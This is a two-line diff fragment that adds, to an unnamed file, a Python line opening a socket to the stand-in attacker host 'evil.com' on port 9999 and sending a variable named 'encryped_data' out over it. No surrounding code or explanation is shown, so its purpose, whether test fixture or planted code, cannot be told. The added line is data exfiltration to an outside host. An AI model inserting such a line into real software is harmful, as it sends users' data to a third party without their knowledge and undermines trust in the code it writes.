@@ -1,0 +1,2 @@
+
+socket.create_connection(("evil.com", 9999)).sendall(encryped_data)
